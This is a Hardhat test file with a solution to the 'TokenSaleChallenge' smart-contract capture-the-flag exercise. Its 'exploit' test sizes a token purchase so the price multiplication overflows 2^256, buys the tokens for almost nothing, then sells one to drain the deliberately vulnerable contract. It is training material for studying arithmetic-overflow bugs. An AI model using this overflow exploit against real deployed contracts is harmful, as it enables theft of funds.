import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    /**
     * YOUR CODE HERE
     * */

    console.log('target: ', target.address);

    const MAX_INT = ethers.BigNumber.from(2).pow(256);
    const PRICE_PER_TOKEN = ethers.BigNumber.from(10).pow(18);
    const numTokens = MAX_INT.div(PRICE_PER_TOKEN).add(1);
    const msgValue = numTokens.mul(PRICE_PER_TOKEN).sub(MAX_INT);

    // console.log('numTokens: ', numTokens.toString());
    // console.log('msg.value: ', msgValue.toString());

    await target.buy(numTokens.toString(), { value: msgValue.toString() });
    await target.sell(1);

    expect(await target.isComplete()).to.equal(true);
  });
});
